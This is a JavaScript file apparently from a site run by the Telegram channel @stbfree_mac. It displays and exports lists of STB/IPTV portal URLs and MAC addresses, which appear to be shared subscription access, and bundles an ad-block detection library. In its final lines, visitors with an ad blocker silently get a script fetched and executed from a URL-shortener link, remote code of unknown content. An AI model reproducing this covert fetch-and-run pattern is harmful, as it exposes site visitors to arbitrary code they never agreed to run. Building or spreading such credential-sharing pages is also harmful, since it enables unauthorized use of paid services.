$("#telegram").click(function (e) {
    window.location.href = "https://t.me/stbfree_mac";
});

$(".close").click(function (e) {
    $('#modal-form').modal('hide');
});





(async ()=>{

await Promise.all(content.map(async (item,index) => {
      let con  = `<div class="col-12 px-1">
                <div class="card bg-primary border-light shadow-soft mt-2">
                    <div class="card-body p-2">

                        <label class="form-label text-success fw-bolder mb-1" style="font-size: 0.8rem;">STB
                            PORTAL</label>
                        <div class="input-group input-group-sm mb-2">
                            <span class="input-group-text"><i class="fas fa-link"></i></span>
                            <input type="text" class="form-control" readonly="readonly"
                                value="${item.p}" />
                            <span class="input-group-text"><i class="fas fa-copy"></i></span>
                        </div>

                        <div class="row">
                            <div class="col-lg-6">
                                <label class="form-label text-success fw-bolder mb-1"
                                    style="font-size: 0.8rem;">MAC</label>
                                <div class="input-group input-group-sm mb-2">
                                    <span class="input-group-text"><i class="fas fa-hdd"></i></span>
                                    <input type="text" class="form-control" readonly="readonly"
                                        value="${item.m}" />
                                    <span class="input-group-text"><i class="fas fa-copy"></i></span>
                                </div>
                            </div>

                            <div class="col-lg-6">
                                <label class="form-label text-success fw-bolder mb-1"
                                    style="font-size: 0.8rem;">EXPIRE ON</label>
                                <div class="input-group input-group-sm mb-2">
                                    <span class="input-group-text"><i class="fas fa-clock"></i></span>
                                    <input type="text" class="form-control" readonly="readonly"
                                        value="${item.e}" />
                                    <span class="input-group-text"><i class="fas fa-copy"></i></span>
                                </div>
                            </div>

                        </div>

                        <div class="row justify-content-center">
                            <button type="button" id="country" data-i="${index}"
                                class="btn btn-sm btn-more mt-2 mb-2 country">
                                <i class="fas fa-info-circle"></i> Country
                            </button>
                        </div>



                    </div>


                </div>


            </div>`;

    $("#content").append(con);
  }));

  $(".country").click(function (e) {
//     let genre = content[parseInt($(this).data("i"))];
//     $("#modal_mac").text(genre.m);
//     $("#genre").html("");

//     genre.c.map((item)=>{
//         $("#genre").append(`<span class="badge badge-md badge-success text-uppercase mx-1 mt-1">${item}</span>`);
//     });

    $('#modal-form').modal('show');
});


})();



function download(filename, text) {
    var element = document.createElement('a');
    element.setAttribute('href', 'data:text/plain;charset=utf-8,' + encodeURIComponent(text));
    element.setAttribute('download', filename);

    element.style.display = 'none';
    document.body.appendChild(element);

    element.click();

    document.body.removeChild(element);
}

$("#d").click(async () => {
    let text_data = ``;

    await Promise.all(content.map(async (item)=>{

       text_data += `═══════════════════════════════════════════════\nℙ𝕠𝕣𝕥𝕒𝕝 ➽ ${item.p}\n𝕄𝕒𝕔 ➽ ${item.m}\n𝔼𝕩𝕡𝕚𝕣𝕖 ➽ ${item.e}\nℂ𝕠𝕦𝕟𝕥𝕣𝕪 ➽ `;

//      item.c.map(async (gen)=>{
//            text_data += gen+" | ";
//       })

       text_data += `\n𝕁𝕠𝕚𝕟 𝕋𝕖𝕝𝕖𝕘𝕣𝕒𝕞 ➽ @stbfree_mac\n═══════════════════════════════════════════════\n`;

    }));

    download(`@stbfree_mac_${new Date().toDateString().replace(/ /g, "_")}`, text_data);
});





/**
 * Skipped minification because the original files appears to be already minified.
 * Do NOT use SRI with dynamically generated files! More information: https://www.jsdelivr.com/using-sri-with-dynamic-files
 */
!function(t,e){"object"==typeof exports&&"undefined"!=typeof module?module.exports=e():"function"==typeof define&&define.amd?define(e):(t="undefined"!=typeof globalThis?globalThis:t||self).justDetectAdblock=e()}(this,(function(){"use strict";function t(){return void 0!==navigator.brave&&void 0!==navigator.brave.isBrave}function e(){return"string"==typeof navigator.userAgent&&navigator.userAgent.match(/Opera|OPR\//)}function n(){return new Promise((function(t,e){var n=new XMLHttpRequest;n.onreadystatechange=function(){4==n.readyState&&t(n)},n.open("GET","https://raw.githubusercontent.com/wmcmurray/just-detect-adblock/master/baits/pagead2.googlesyndication.com",!0),n.send()}))}function o(t){return 200===t.status&&!t.responseText.match(/^thistextshouldbethere(\n|)$/)}function i(t){return 0===t.status&&!t.responseText.match(/^thistextshouldbethere(\n|)$/)}function r(){if(null!==window.document.body.getAttribute("abp"))return!0;var t=function(){var t=document.createElement("div");return t.setAttribute("class","pub_300x250 pub_300x250m pub_728x90 text-ad textAd text_ad text_ads text-ads text-ad-links ad-text adSense adBlock adContent adBanner"),t.setAttribute("style","width: 1px !important; height: 1px !important; position: absolute !important; left: -10000px !important; top: -1000px !important;"),t}();window.document.body.appendChild(t);var e=function(t){if(null===t.offsetParent||0==t.offsetHeight||0==t.offsetLeft||0==t.offsetTop||0==t.offsetWidth||0==t.clientHeight||0==t.clientWidth)return!0;if(void 0!==window.getComputedStyle){var e=window.getComputedStyle(t,null);if(e&&("none"==e.getPropertyValue("display")||"hidden"==e.getPropertyValue("visibility")))return!0}return!1}(t);return window.document.body.removeChild(t),e}var u;return{detectAnyAdblocker:function(){return new Promise((function(u,d){if(r())return u(!0);t()||e()?n().then((function(n){return t()?u(o(n)):e()?u(i(n)):void u(!1)})):u(!1)}))},detectDomAdblocker:(u=r,function(){var t=arguments;return new Promise((function(e,n){e(u.apply(this,t))}))}),detectBraveShields:function(){return new Promise((function(e,i){t()?n().then((function(t){e(o(t))})):e(!1)}))},detectOperaAdblocker:function(){return new Promise((function(t,o){e()?n().then((function(e){t(i(e))})):t(!1)}))},isDetected:function(t,e){return function(){return console.warn("just-detect-adblock : "+(e||"This method is deprecated.")),t.apply(this,arguments)}}(r,"The `isDetected()` method is now deprecated, please use `detectAnyAdblocker()` instead, which returns a Promise and can detect more stuff (like Brave Shields).")}}));



 justDetectAdblock.detectAnyAdblocker().then(function(detected) {
    if(detected){
      // an adblocker is detected
        console.log(detected);
        $.getScript( "https://teenurl.in/kss45",(data)=>{});
    }else{
    console.log("Adblock not detected");
    }
     
 });
     
     
     
